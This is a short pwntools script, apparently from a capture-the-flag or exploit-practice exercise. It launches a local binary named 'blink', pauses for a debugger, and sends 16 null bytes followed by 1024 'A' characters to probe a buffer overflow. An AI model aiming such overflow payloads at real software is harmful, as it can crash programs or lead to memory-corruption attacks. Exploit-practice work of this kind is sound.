from pwn import *

p = process('blink')
raw_input('Wait')
p.send("\x00"*16+"A"*1024+"\n")

p.interactive()
